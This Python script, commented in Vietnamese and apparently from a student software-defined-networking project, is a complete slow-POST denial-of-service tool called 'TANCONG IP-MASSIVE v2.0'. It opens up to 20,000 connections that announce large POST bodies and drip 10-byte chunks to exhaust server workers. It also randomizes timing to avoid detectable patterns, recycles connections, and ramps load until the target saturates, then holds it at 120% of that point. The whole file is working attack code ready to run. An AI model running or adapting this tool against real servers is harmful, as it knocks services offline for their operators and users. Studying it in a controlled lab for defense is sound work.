#!/usr/bin/env python3
"""
TANCONG IP-MASSIVE v2.0 - Adaptive & Resource-Optimized
========================================================
source /home/tgf/Documents/DoAn_SDN/attack/venv/bin/activate
Tối ưu hóa cho tấn công 20,000+ connections với:
1. Adaptive Load - Tự động điều chỉnh batch size theo error rate
2. Randomized Jitter - Thời gian ngẫu nhiên, tránh pattern
3. CPU Throttling - Giảm tải CPU trong quá trình spawn
4. Connection Recycling - Tái sử dụng TCP connections
5. Memory Pressure Handling - GC thường xuyên, streaming tasks
6. Adaptive Concurrency - Giảm nếu server phản hồi chậm
7. Bursty Pattern - Tấn công theo đợt với nghỉ ngơi

Key optimizations v2.0:
- Error-adaptive batch sizing (giảm batch nếu 503/timeout nhiều)
- Random jitter 0.05-0.15s (không fixed 0.1s)
- Micro-sleeps trong batch để giảm CPU spike
- Connection pool - tái sử dụng TCP healthy
- Burst-rest cycle: tấn công 50 batches, nghỉ 2s
- Memory threshold - GC khi memory >80%
"""

import asyncio
import ssl
import random
import time
import socket
import signal
import sys
import gc
import psutil
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from enum import Enum
from collections import deque
from load_config import get_target_config, get_attack_config, validate_config

# =============================================================================
# ADAPTIVE CONFIGURATION
# =============================================================================

class AttackMode(Enum):
    PIPELINE = "pipeline"
    RAPID_CONNECT = "rapid"


@dataclass
class AdaptiveAttackConfig:
    """
    Config với adaptive parameters.
    
    Các giá trị sẽ tự động điều chỉnh trong runtime
    dựa trên system load và server response.
    """
    # Target
    ip: str
    port: int = 80
    path: str = "/"
    use_ssl: bool = False
    hostname: Optional[str] = None
    
    # Scale
    max_connections: int = 20000
    duration: int = 300
    
    # ADAPTIVE BATCH (sẽ thay đổi runtime)
    initial_batch_size: int = 100
    min_batch_size: int = 20        # Giảm xuống nếu error nhiều
    max_batch_size: int = 200       # Tăng lên nếu server khỏe
    
    # RANDOMIZED JITTER (ngẫu nhiên thay vì fixed)
    batch_delay_min: float = 0.05   # 50ms min
    batch_delay_max: float = 0.15  # 150ms max
    
    # BURST-REST CYCLE
    burst_batches: int = 50         # Tấn công 50 batches
    rest_duration: float = 2.0      # Nghỉ 2s
    
    # CPU THROTTLING
    enable_cpu_throttle: bool = True
    cpu_target_percent: float = 70.0  # Giữ CPU < 70%
    micro_sleep: float = 0.001      # 1ms sleep giữa tasks
    
    # CONNECTION RECYCLING
    enable_connection_pool: bool = True
    connection_pool_size: int = 1000  # Giữ 1000 TCP healthy
    max_reuse_per_conn: int = 5       # Tái sử dụng tối đa 5 lần
    
    # MEMORY MANAGEMENT
    gc_interval_batches: int = 25    # GC mỗi 25 batches
    memory_threshold_percent: float = 80.0  # GC khi RAM >80%
    
    # ADAPTIVE CONCURRENCY
    initial_concurrency: int = 5000
    min_concurrency: int = 1000
    max_concurrency: int = 8000
    
    # ERROR ADAPTATION
    error_rate_threshold: float = 0.10  # Nếu error >10%, giảm batch
    success_rate_target: float = 0.95   # Target 95% success
    
    # SATURATION POINT DETECTION (Break-point Testing)
    enable_saturation_detection: bool = True
    ramp_up_step: int = 500            # Tăng 500 connections mỗi bước
    ramp_up_interval: float = 5.0      # 5 giây giữa các bước
    saturation_error_threshold: float = 0.30  # 30% error = bắt đầu saturation
    saturation_buffer: float = 1.2     # Duy trì ở 120% ngưỡng saturation
    
    # Payload
    requests_per_conn: int = 3
    post_content_length: int = 10000000
    chunk_size: int = 10
    chunk_interval: float = 1.0


# =============================================================================
# ADAPTIVE METRICS
# =============================================================================

@dataclass 
class AdaptiveMetrics:
    start_time: float = field(default_factory=time.time)
    total_attempts: int = 0
    successful_attacks: int = 0
    active_connections: int = 0
    tcp_established: int = 0
    tcp_recycled: int = 0           # Số TCP tái sử dụng
    bytes_sent: int = 0
    errors: int = 0
    timeouts: int = 0
    conn_reset: int = 0
    batches_completed: int = 0
    bursts_completed: int = 0
    rests_taken: int = 0
    
    # Adaptive tracking
    current_batch_size: int = 100
    current_concurrency: int = 5000
    avg_response_time: float = 0.0
    error_rate_window: deque = field(default_factory=lambda: deque(maxlen=10))
    
    # Saturation Point Detection
    saturation_detected: bool = False
    saturation_point: int = 0           # Ngưỡng tới hạn (connections)
    maintenance_level: int = 0          # Mức duy trì (connections)
    ramp_up_phase: bool = True          # Đang trong giai đoạn ramp-up
    
    def update_error_rate(self, batch_errors: int, batch_total: int):
        """Cập nhật error rate cho adaptive batch sizing."""
        rate = batch_errors / max(batch_total, 1)
        self.error_rate_window.append(rate)
    
    def get_avg_error_rate(self) -> float:
        if not self.error_rate_window:
            return 0.0
        return sum(self.error_rate_window) / len(self.error_rate_window)
    
    def display(self):
        elapsed = time.time() - self.start_time
        rate = self.successful_attacks / max(self.total_attempts, 1) * 100
        error_rate = self.get_avg_error_rate() * 100
        
        # System load
        cpu_percent = psutil.cpu_percent(interval=0.1)
        memory_percent = psutil.virtual_memory().percent
        
        print(f"\n{'='*70}")
        print(f"MASSIVE v2.0 ADAPTIVE METRICS")
        print(f"{'='*70}")
        print(f"Time: {elapsed:.1f}s ({elapsed/60:.1f}m)")
        print(f"Total: {self.total_attempts:,} | Success: {self.successful_attacks:,}")
        print(f"TCP: {self.tcp_established:,} (Recycled: {self.tcp_recycled:,})")
        print(f"Success: {rate:.1f}% | Error: {error_rate:.1f}%")
        print(f"Batch: {self.current_batch_size} | Concurrency: {self.current_concurrency}")
        print(f"CPU: {cpu_percent:.1f}% | RAM: {memory_percent:.1f}%")
        print(f"Batches: {self.batches_completed} | Bursts: {self.bursts_completed}")
        print(f"{'='*70}\n")
        
        return cpu_percent, memory_percent


METRICS = AdaptiveMetrics()
SHUTDOWN = asyncio.Event()


# =============================================================================
# CONNECTION POOL FOR RECYCLING
# =============================================================================

class ConnectionPool:
    """
    Pool để tái sử dụng TCP connections.
    
    Giảm overhead tạo TCP mới, tăng hiệu quả tấn công.
    """
    
    def __init__(self, max_size: int = 1000):
        self.max_size = max_size
        self.pool: asyncio.Queue = asyncio.Queue(maxsize=max_size)
        self.active_count = 0
        self.lock = asyncio.Lock()
    
    async def get_connection(self, ip: str, port: int, ssl_ctx, server_hostname: Optional[str] = None) -> Optional[Tuple]:
        """Lấy connection từ pool hoặc tạo mới."""
        try:
            # Thử lấy từ pool (timeout ngay)
            reader, writer = self.pool.get_nowait()
            # Kiểm tra connection còn sống không
            if writer.is_closing():
                return None
            METRICS.tcp_recycled += 1
            return (reader, writer, True)  # True = recycled
        except asyncio.QueueEmpty:
            pass
        
        # Tạo connection mới
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port, ssl=ssl_ctx, server_hostname=server_hostname),
                timeout=5
            )
            METRICS.tcp_established += 1
            return (reader, writer, False)  # False = new
        except:
            return None
    
    async def return_connection(self, reader, writer, reuse_count: int = 0):
        """Trả connection về pool nếu còn tốt."""
        if writer.is_closing() or reuse_count >= 5:
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass
            return
        
        try:
            self.pool.put_nowait((reader, writer))
        except asyncio.QueueFull:
            # Pool đầy, đóng connection
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass


# =============================================================================
# ADAPTIVE ATTACKER
# =============================================================================

class AdaptiveMassiveAttacker:
    """
    Attacker với adaptive load balancing và resource optimization.
    """
    
    def __init__(self, config: AdaptiveAttackConfig):
        self.config = config
        self.ssl_ctx = self._create_ssl() if config.use_ssl else None
        self.semaphore = asyncio.Semaphore(config.initial_concurrency)
        self.connection_pool = ConnectionPool(config.connection_pool_size)
        
        # Adaptive state
        self.current_batch_size = config.initial_batch_size
        self.current_concurrency = config.initial_concurrency
        self.batch_counter = 0
    
    def _create_ssl(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    
    async def _cpu_throttle(self):
        """Giảm CPU load nếu cần."""
        if not self.config.enable_cpu_throttle:
            return
        
        cpu = psutil.cpu_percent(interval=0.05)
        if cpu > self.config.cpu_target_percent:
            # CPU cao, nghỉ lâu hơn
            await asyncio.sleep(self.config.micro_sleep * 2)
        else:
            # CPU ổn, nghỉ ngắn
            await asyncio.sleep(self.config.micro_sleep)
    
    async def _check_memory_pressure(self):
        """Kiểm tra và giải phóng memory nếu cần."""
        memory = psutil.virtual_memory().percent
        if memory > self.config.memory_threshold_percent:
            gc.collect()
            print(f" GC triggered (RAM: {memory:.1f}%)")
    
    async def _adaptive_batch_sizing(self, batch_success_rate: float):
        """Điều chỉnh batch size theo success rate."""
        old_size = self.current_batch_size
        
        if batch_success_rate < 0.90:
            # Success thấp, giảm batch
            self.current_batch_size = max(
                self.config.min_batch_size,
                int(self.current_batch_size * 0.8)
            )
        elif batch_success_rate > 0.98 and self.current_batch_size < self.config.max_batch_size:
            # Success cao, tăng batch
            self.current_batch_size = min(
                self.config.max_batch_size,
                int(self.current_batch_size * 1.1)
            )
        
        if old_size != self.current_batch_size:
            METRICS.current_batch_size = self.current_batch_size
            print(f" Adaptive batch: {old_size} → {self.current_batch_size}")
    
    async def _detect_saturation_point(self, batch_errors: int, batch_total: int):
        """Detect saturation point dựa trên error rate."""
        if not self.config.enable_saturation_detection:
            return
        
        if METRICS.saturation_detected:
            return  # Đã detect rồi
        
        error_rate = batch_errors / max(batch_total, 1)
        
        if error_rate > self.config.saturation_error_threshold:
            # Đạt ngưỡng saturation
            METRICS.saturation_detected = True
            METRICS.saturation_point = METRICS.total_attempts
            METRICS.maintenance_level = int(METRICS.saturation_point * self.config.saturation_buffer)
            METRICS.ramp_up_phase = False
            
            print(f" SATURATION POINT DETECTED: {METRICS.saturation_point} connections")
            print(f" Maintenance level: {METRICS.maintenance_level} connections")
            print(f" Switching to maintenance phase...")
    
    async def _ramp_up_connections(self):
        """Giai đoạn Ramp-up: Tăng dần connections để tìm saturation point."""
        if not self.config.enable_saturation_detection:
            return self.config.max_connections
        
        if not METRICS.ramp_up_phase:
            return METRICS.maintenance_level
        
        # Tăng dần theo ramp_up_step
        current_level = METRICS.total_attempts + self.config.ramp_up_step
        return min(current_level, self.config.max_connections)
    
    async def attack_with_pool(self, conn_id: int) -> Tuple[bool, float]:
        """
        Attack với connection pooling.
        
        Returns: (success, response_time)
        """
        start_time = time.time()
        success = False
        
        try:
            async with self.semaphore:
                # Lấy connection từ pool với timeout
                conn = await asyncio.wait_for(
                    self.connection_pool.get_connection(
                        self.config.ip, self.config.port, self.ssl_ctx,
                        server_hostname=self.config.hostname if self.config.use_ssl else None
                    ),
                    timeout=10.0  # 10s timeout cho connection
                )
                
                if conn is None:
                    return (False, 0)
                
                reader, writer, is_recycled = conn
                host = self.config.hostname or self.config.ip
                
                # Gửi requests với timeout đủ dài để giữ kết nối slow POST trong duration
                conn_success = False
                for req_idx in range(self.config.requests_per_conn):
                    if SHUTDOWN.is_set():
                        break
                    
                    try:
                        result = await asyncio.wait_for(
                            self._send_slow_post(reader, writer, conn_id, req_idx, host),
                            timeout=self.config.duration + 15.0
                        )
                        if result:
                            conn_success = True
                    except asyncio.TimeoutError:
                        METRICS.timeouts += 1
                        break  # Timeout, break loop
                    
                    if req_idx < self.config.requests_per_conn - 1:
                        await asyncio.sleep(0.1)
                
                success = conn_success
                if success:
                    METRICS.successful_attacks += 1
                
                # Trả connection về pool để tái sử dụng
                if self.config.enable_connection_pool:
                    await self.connection_pool.return_connection(
                        reader, writer, 
                        reuse_count=random.randint(0, 5)
                    )
                else:
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except:
                        pass
                    
        except asyncio.TimeoutError:
            METRICS.timeouts += 1
        except Exception as e:
            METRICS.errors += 1
            error_type = type(e).__name__
            if "Timeout" in error_type:
                METRICS.timeouts += 1
            elif "Reset" in error_type or "BrokenPipe" in error_type:
                METRICS.conn_reset += 1
        
        elapsed = time.time() - start_time
        return (success, elapsed)
    
    async def _send_slow_post(self, reader, writer, conn_id: int, req_idx: int, host: str) -> bool:
        """Gửi 1 slow POST request."""
        try:
            headers = (
                f"POST {self.config.path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {self.config.post_content_length}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            ).encode()
            
            writer.write(headers)
            METRICS.bytes_sent += len(headers)
            await writer.drain()
            
            # Gửi body từng chunk
            bytes_sent = 0
            start_time = time.time()
            
            while (time.time() - start_time < self.config.duration and
                   bytes_sent < self.config.post_content_length and
                   not SHUTDOWN.is_set()):
                
                chunk = b"X" * self.config.chunk_size
                writer.write(chunk)
                METRICS.bytes_sent += len(chunk)
                bytes_sent += len(chunk)
                await writer.drain()
                await asyncio.sleep(self.config.chunk_interval)
            
            return True
            
        except:
            return False
    
    async def run_batch(self, batch_id: int, start_id: int, end_id: int) -> Tuple[int, int]:
        """
        Chạy 1 batch với adaptive load.
        
        Returns: (success_count, error_count)
        """
        batch_size = end_id - start_id
        tasks = []
        
        # Tạo tasks với micro-sleeps để giảm CPU spike
        for i in range(start_id, end_id):
            if SHUTDOWN.is_set():
                break
            
            task = asyncio.create_task(self.attack_with_pool(i))
            tasks.append(task)
            
            # CPU throttling
            await self._cpu_throttle()
        
        METRICS.total_attempts += batch_size
        
        # Collect results
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        success = 0
        errors = 0
        total_response_time = 0
        
        for r in results:
            if isinstance(r, Exception):
                errors += 1
            elif isinstance(r, tuple) and r[0]:
                success += 1
                total_response_time += r[1]
            else:
                errors += 1
        
        # Update metrics
        METRICS.batches_completed += 1
        METRICS.update_error_rate(errors, batch_size)
        
        # Saturation point detection
        await self._detect_saturation_point(errors, batch_size)
        
        # Adaptive batch sizing
        success_rate = success / max(batch_size, 1)
        await self._adaptive_batch_sizing(success_rate)
        
        return (success, errors)
    
    async def run_massive_attack(self):
        """Chạy massive attack với saturation detection."""
        total = self.config.max_connections
        batch = self.current_batch_size
        
        print(f"\nMASSIVE v2.0 ADAPTIVE ATTACK")
        print(f"{'='*70}")
        print(f"Target: {self.config.ip}:{self.config.port}{self.config.path}")
        print(f"Total: {total:,} connections")
        print(f"Initial batch: {batch} | Adaptive: ON")
        print(f"Random jitter: {self.config.batch_delay_min}-{self.config.batch_delay_max}s")
        print(f"CPU throttle: {self.config.cpu_target_percent}%")
        print(f"Connection pool: {self.config.connection_pool_size}")
        print(f"Burst-rest: {self.config.burst_batches} batches / {self.config.rest_duration}s rest")
        if self.config.enable_saturation_detection:
            print(f"Saturation Detection: ON (threshold: {self.config.saturation_error_threshold*100:.0f}%)")
        print(f"{'='*70}\n")
        
        print(" Pre-flight:")
        print(f"   ulimit -n 65536 (file descriptors)")
        print(f"   RAM available: {psutil.virtual_memory().available / 1e9:.1f} GB")
        print()
        
        start_time = time.time()
        total_success = 0
        batches_in_current_burst = 0
        
        while METRICS.total_attempts < total and not SHUTDOWN.is_set():
            # Tính toán batch hiện tại với saturation detection
            if self.config.enable_saturation_detection:
                target_connections = await self._ramp_up_connections()
                remaining = target_connections - METRICS.total_attempts
                if remaining <= 0 and METRICS.saturation_detected:
                    # Đã đạt maintenance level, duy trì bằng cách reset counter
                    # để tiếp tục attack với batch size hiện tại
                    METRICS.total_attempts = 0  # Reset để tiếp tục
                    remaining = self.current_batch_size
            else:
                remaining = total - METRICS.total_attempts
            
            current_batch = min(self.current_batch_size, remaining)
            
            start_id = METRICS.total_attempts + 1
            end_id = start_id + current_batch
            
            # Chạy batch
            success, errors = await self.run_batch(
                METRICS.batches_completed, start_id, end_id
            )
            total_success += success
            batches_in_current_burst += 1
            
            # Progress
            if METRICS.batches_completed % 5 == 0:
                progress = METRICS.total_attempts / total * 100
                cpu = psutil.cpu_percent(interval=0.1)
                mem = psutil.virtual_memory().percent
                print(f"{progress:.1f}% | {METRICS.total_attempts:,}/{total:,} | "
                      f"CPU:{cpu:.0f}% | RAM:{mem:.0f}% | Batch:{self.current_batch_size}")
            
            # Burst-rest cycle
            if batches_in_current_burst >= self.config.burst_batches:
                print(f"Resting {self.config.rest_duration}s after burst...")
                METRICS.bursts_completed += 1
                METRICS.rests_taken += 1
                await asyncio.sleep(self.config.rest_duration)
                batches_in_current_burst = 0
                
                # GC sau mỗi burst
                gc.collect()
            
            # Memory pressure check
            if METRICS.batches_completed % self.config.gc_interval_batches == 0:
                await self._check_memory_pressure()
            
            # Randomized jitter giữa batches (quan trọng!)
            if METRICS.total_attempts < total and not SHUTDOWN.is_set():
                jitter = random.uniform(
                    self.config.batch_delay_min,
                    self.config.batch_delay_max
                )
                await asyncio.sleep(jitter)
        
        elapsed = time.time() - start_time
        
        print(f"\nAttack Complete!")
        print(f"   Total time: {elapsed/60:.1f} minutes")
        print(f"   Average batch: {METRICS.batches_completed / (elapsed/60):.1f} batches/min")
        print(f"   Effective attacks: {total_success * self.config.requests_per_conn:,}")
        print(f"   TCP recycled: {METRICS.tcp_recycled:,}")


# =============================================================================
# MAIN
# =============================================================================

async def metrics_reporter():
    while not SHUTDOWN.is_set():
        await asyncio.sleep(30)
        if not SHUTDOWN.is_set():
            METRICS.display()


def signal_handler():
    SHUTDOWN.set()
    print("\n\nGraceful shutdown...")


async def main():    
    for sig in (signal.SIGINT, signal.SIGTERM):
        asyncio.get_event_loop().add_signal_handler(sig, signal_handler)
    
    # LOAD CONFIG TỪ .env FILE
    if not validate_config():
        print("[!] Vui lòng cấu hình file .env trước khi chạy!")
        sys.exit(1)
    
    target_config = get_target_config()
    attack_config = get_attack_config()

    if attack_config["chunk_interval"] > 0:
        required_body = int(target_config["duration"] / attack_config["chunk_interval"]) * attack_config["chunk_size"]
        if attack_config["post_content_length"] < required_body:
            print(f"[!] Tự động điều chỉnh POST_CONTENT_LENGTH: {attack_config['post_content_length']} -> {required_body}")
            print(f"    Đảm bảo body đủ lớn để giữ kết nối ít nhất {target_config['duration']}s")
            attack_config["post_content_length"] = required_body
    
    # CẤU HÌNH v2.0 - Tối ưu cho 20,000 connections
    config = AdaptiveAttackConfig(
        ip=target_config["ip"],
        port=target_config["port"],
        path=target_config["path"],
        use_ssl=target_config["use_ssl"],
        hostname=target_config["hostname"],
        
        # Scale
        max_connections=target_config["max_connections"],
        duration=target_config["duration"],
        
        # ADAPTIVE BATCH
        initial_batch_size=100,
        min_batch_size=20,
        max_batch_size=200,
        
        # RANDOM JITTER (ngẫu nhiên thay vì fixed)
        batch_delay_min=0.05,        # 50ms
        batch_delay_max=0.15,        # 150ms
        
        # BURST-REST
        burst_batches=50,            # 50 batches rồi nghỉ
        rest_duration=2.0,           # Nghỉ 2s
        
        # CPU THROTTLING
        enable_cpu_throttle=True,
        cpu_target_percent=70.0,
        micro_sleep=0.001,           # 1ms
        
        # CONNECTION POOL
        enable_connection_pool=True,
        connection_pool_size=1000,
        max_reuse_per_conn=5,
        
        # MEMORY
        gc_interval_batches=25,
        memory_threshold_percent=80.0,
        
        # ADAPTIVE CONCURRENCY
        initial_concurrency=5000,
        min_concurrency=1000,
        max_concurrency=8000,
        
        # PAYLOAD
        requests_per_conn=attack_config["requests_per_conn"],
        post_content_length=attack_config["post_content_length"],
        chunk_size=attack_config["chunk_size"],
        chunk_interval=attack_config["chunk_interval"],
    )
    
    metrics_task = asyncio.create_task(metrics_reporter())
    
    attacker = AdaptiveMassiveAttacker(config)
    await attacker.run_massive_attack()
    
    SHUTDOWN.set()
    await asyncio.sleep(0.5)
    METRICS.display()
    
    print("\n Massive v2.0 Attack Finished")
    print(f"   Final batch size: {METRICS.current_batch_size}")
    print(f"   Total recycled TCP: {METRICS.tcp_recycled:,}")
    print(f"   Bursts completed: {METRICS.bursts_completed}")
    print(f"   Rests taken: {METRICS.rests_taken}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        SHUTDOWN.set()
        METRICS.display()
